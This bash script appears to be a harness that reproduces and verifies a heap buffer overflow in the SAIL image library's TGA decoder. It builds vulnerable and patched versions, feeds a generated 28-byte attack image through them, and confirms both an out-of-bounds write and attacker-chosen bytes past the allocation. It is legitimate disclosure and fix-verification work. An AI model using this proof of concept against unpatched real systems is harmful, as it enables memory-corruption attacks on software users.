#!/usr/bin/env bash
# sailtga2shell reproducible harness: real SAIL 0.9.10 / 1.0.0 TGA codec,
# driven only through sail_load_from_file(). All inputs are local files.
set -u
cd "$(dirname "$0")/.."
ROOT="$PWD"
mkdir -p evidence

pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
need() { grep -q -- "$2" "$1" 2>/dev/null; }

echo "== pin verification =="
for pair in \
 "src-v0.9.10.tar.gz dc0d6fa87cb4fa8b514f450a3fb13cee6e3e60f03250f683564fabbec0f722e3" \
 "src-v1.0.0.tar.gz b6f77d6d451b72202c8e11bd5057b697a21f7b6c4ef713f19a96de5a16c08916" \
 "pinned/tga-v0.9.10.c ca00ecde0ba1ca3e0cbee913bfbd88bdeab24468226aca0446d8ea27ae3a45c7" \
 "pinned/tga-fix-parent.c 56467c2fc77995ba561f483e463b08247619f8c4bf6489ba0dc1254351932af7" \
 "pinned/tga-fix.c 13add077091532bad66f9c3a2b52d1558c652d15e05cb571912a83f8c91b58d3" \
 "pinned/tga-v1.0.0.c 13add077091532bad66f9c3a2b52d1558c652d15e05cb571912a83f8c91b58d3" \
 "harness/driver.c 68d083edc106dd7093502ee42123853484820b0cf28186b3feee310ce276f2c9" \
 "harness/make-poc.py e5e1f8aa351c6ab168bf246f12bf19a3ffdfc35c8f2f80527ad47596d892210f" \
 "stubs/libavutil/pixfmt.h b452ef37e3308339924e62eadf0ce7d4674732953927f745423b10ab60dd422e"; do
    set -- $pair
    got=$(sha256sum "$1" | cut -d' ' -f1)
    [ "$got" = "$2" ] && ok "pin $1" || bad "pin $1 ($got != $2)"
done

echo "== source claims =="
if need pinned/tga-v0.9.10.c 'const unsigned pixel_size = (tga_state->file_header.bpp + 7) / 8;' \
   && need pinned/tga-v0.9.10.c 'memcpy(pixels, pixel, pixel_size);' \
   && need pinned/tga-v0.9.10.c 'strict_read(tga_state->io->stream, pixels, pixel_size)'; then
    ok "v0.9.10 derives stride from header bpp in both RLE packet types"
else
    bad "v0.9.10 derives stride from header bpp in both RLE packet types"
fi
if need pinned/tga-v1.0.0.c 'resolved_bpp != (unsigned)tga_state->file_header.bpp' \
   && need pinned/tga-v1.0.0.c 'sail_bits_per_pixel(image->pixel_format)' \
   && cmp -s pinned/tga-fix.c pinned/tga-v1.0.0.c; then
    ok "v1.0.0 vendor fix present and identical to fix commit"
else
    bad "v1.0.0 vendor fix present and identical to fix commit"
fi
if (diff -u pinned/tga-fix-parent.c pinned/tga-fix.c > evidence/vendor-fix.diff 2>&1 || true) \
   && need evidence/vendor-fix.diff 'resolved_bpp != (unsigned)tga_state->file_header.bpp'; then
    ok "fix hunk is the only functional change from parent to fix commit"
else
    bad "fix hunk is the only functional change from parent to fix commit"
fi

echo "== build real static SAIL trees from pinned tarballs =="
[ -f sail-0.9.10/CMakeLists.txt ] || tar -xzf src-v0.9.10.tar.gz
[ -f sail-1.0.0/CMakeLists.txt ] || tar -xzf src-v1.0.0.tar.gz
build_tree() {
    tag=$1; src=$2; cc=$3; mode=$4
    [ -d "build-$tag" ] && return 0
    if [ "$mode" = asan ]; then
        cflags="-fsanitize=address -fno-omit-frame-pointer -g -O0"
        ldflags="-fsanitize=address"
    else
        cflags="-g -O0"; ldflags=""
    fi
    # v1.0.0's optional libswscale headers are absent on this host; the empty
    # stubs compile only code behind SAIL_MANIP_SWSCALE_ENABLED (forced OFF).
    [ "$src" = sail-1.0.0 ] && cflags="$cflags -I$ROOT/stubs"
    cmake -S "$src" -B "build-$tag" -G Ninja \
        -DBUILD_SHARED_LIBS=OFF -DSAIL_ONLY_CODECS=tga \
        -DSAIL_BUILD_APPS=OFF -DSAIL_BUILD_EXAMPLES=OFF \
        -DSAIL_BUILD_BINDINGS=OFF -DBUILD_TESTING=OFF \
        -DSAIL_MANIP_USE_SWSCALE=OFF -DCMAKE_BUILD_TYPE=Debug \
        -DCMAKE_C_COMPILER="$cc" -DCMAKE_C_FLAGS="$cflags" \
        -DCMAKE_EXE_LINKER_FLAGS="$ldflags" > "evidence/configure-$tag.log" 2>&1 \
        && cmake --build "build-$tag" -j4 > "evidence/build-$tag.log" 2>&1
}
for spec in 'vuln-clang-asan sail-0.9.10 clang asan' \
            'vuln-gcc-asan sail-0.9.10 gcc asan' \
            'vuln-plain sail-0.9.10 gcc plain' \
            'fixed-asan sail-1.0.0 clang asan' \
            'fixed-plain sail-1.0.0 gcc plain'; do
    set -- $spec
    build_tree "$1" "$2" "$3" "$4" && ok "build $1" || bad "build $1"
done

echo "== compile public-API driver and generate inputs =="
compile_driver() {
    tag=$1; src=$2; cc=$3; mode=$4
    if [ "$mode" = asan ]; then
        cflags="-fsanitize=address -fno-omit-frame-pointer -g -O0"
        ldflags="-fsanitize=address"
    else
        cflags="-g -O0"; ldflags=""
    fi
    [ "$src" = sail-1.0.0 ] && cflags="$cflags -I$ROOT/stubs"
    $cc $cflags -I "$src/src" -I "build-$tag/include" harness/driver.c \
        -Wl,--start-group build-$tag/src/sail/libsail.a \
        build-$tag/src/sail-codecs-archive/libsail-codecs.a \
        build-$tag/src/sail-common/libsail-common.a \
        build-$tag/src/sail-manip/libsail-manip.a -Wl,--end-group \
        -lm $ldflags -o "evidence/$tag" 2> "evidence/compile-$tag.log"
}
compile_driver vuln-clang-asan sail-0.9.10 clang asan && ok "compile clang ASan driver" || bad "compile clang ASan driver"
compile_driver vuln-gcc-asan sail-0.9.10 gcc asan && ok "compile gcc ASan driver" || bad "compile gcc ASan driver"
compile_driver vuln-plain sail-0.9.10 gcc plain && ok "compile plain vulnerable driver" || bad "compile plain vulnerable driver"
compile_driver fixed-asan sail-1.0.0 clang asan && ok "compile fixed ASan driver" || bad "compile fixed ASan driver"
compile_driver fixed-plain sail-1.0.0 gcc plain && ok "compile plain fixed driver" || bad "compile plain fixed driver"
python3 harness/make-poc.py evidence && ok "generate three 28-byte TGA inputs" || bad "generate three 28-byte TGA inputs"
for f in attack safe8 safe32; do
    [ "$(wc -c < evidence/$f.tga)" -eq 28 ] && ok "$f.tga is 28 bytes" || bad "$f.tga is 28 bytes"
done

echo "== rung 3: ASan-confirmed corruption =="
for spec in 'vuln-clang-asan clang' 'vuln-gcc-asan gcc'; do
    set -- $spec
    ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 "./evidence/$1" evidence/attack.tga \
        > "evidence/asan-$1-attack.out" 2>&1
    rc=$?
    [ "$rc" -ne 0 ] && ok "$2 ASan attack rc=$rc" || bad "$2 ASan attack exited 0"
    if need "evidence/asan-$1-attack.out" 'heap-buffer-overflow' \
       && need "evidence/asan-$1-attack.out" 'WRITE of size 4' \
       && need "evidence/asan-$1-attack.out" '0 bytes after 256-byte region' \
       && need "evidence/asan-$1-attack.out" 'sail_codec_load_frame_v8_tga' \
       && need "evidence/asan-$1-attack.out" 'tga.c:269' \
       && need "evidence/asan-$1-attack.out" 'sail_load_from_file'; then
        ok "$2 ASan WRITE-4 at verbatim tga.c:269 past 256-byte region"
    else
        bad "$2 ASan WRITE-4 at verbatim tga.c:269 past 256-byte region"
    fi
done
for f in safe8 safe32; do
    ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./evidence/vuln-clang-asan evidence/$f.tga \
        > "evidence/asan-vuln-$f.out" 2>&1
    rc=$?
    [ "$rc" -eq 0 ] && ok "vulnerable ASan $f control rc=$rc" || bad "vulnerable ASan $f control rc=$rc"
done
ASAN_OPTIONS=detect_leaks=0:halt_on_error=1 ./evidence/fixed-asan evidence/attack.tga \
    > evidence/asan-fixed-attack.out 2>&1
rc=$?
need evidence/asan-fixed-attack.out 'rc=213' \
    && ok "vendor-fixed ASan attack rejected (rc=213 printed)" || bad "vendor-fixed ASan attack rejected"
! need evidence/asan-fixed-attack.out 'ERROR: AddressSanitizer' \
    && ok "vendor-fixed ASan attack has no ASan report" || bad "vendor-fixed ASan attack has ASan report"

echo "== rung 4: attacker-chosen bytes past the allocation (plain allocator) =="
./evidence/vuln-plain evidence/attack.tga probe > evidence/plain-vuln-attack.out 2>&1
if need evidence/plain-vuln-attack.out 'rc=0' \
   && need evidence/plain-vuln-attack.out 'w=16 h=16 pixel_format=16' \
   && need evidence/plain-vuln-attack.out 'tail_248_264=aabbccddaabbccddaabbccddaabbccdd'; then
    ok "chosen aa bb cc dd at offsets 256..263 beyond 256-byte allocation"
else
    bad "chosen aa bb cc dd at offsets 256..263 beyond 256-byte allocation"
fi
./evidence/vuln-plain evidence/safe8.tga probe > evidence/plain-vuln-safe8.out 2>&1
if need evidence/plain-vuln-safe8.out 'rc=0' \
   && need evidence/plain-vuln-safe8.out 'tail_248_264=aaaaaaaaaaaaaaaa0000000000000000'; then
    ok "plain vulnerable safe8 control: chosen OOB bytes absent"
else
    bad "plain vulnerable safe8 control: chosen OOB bytes absent"
fi
./evidence/vuln-plain evidence/safe32.tga probe > evidence/plain-vuln-safe32.out 2>&1
if need evidence/plain-vuln-safe32.out 'rc=0' \
   && need evidence/plain-vuln-safe32.out 'tail_248_264=aabbccddaabbccddaabbccddaabbccdd'; then
    ok "plain vulnerable safe32 control: same bytes stay inside 1024-byte buffer"
else
    bad "plain vulnerable safe32 control: same bytes stay inside 1024-byte buffer"
fi
./evidence/fixed-plain evidence/attack.tga > evidence/plain-fixed-attack.out 2>&1
if need evidence/plain-fixed-attack.out 'rc=213' \
   && need evidence/plain-fixed-attack.out 'SAIL_ERROR_INVALID_IMAGE'; then
    ok "plain vendor-fixed attack rejected by resolved-bpp guard"
else
    bad "plain vendor-fixed attack rejected by resolved-bpp guard"
fi

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ] && exit 0 || exit 1
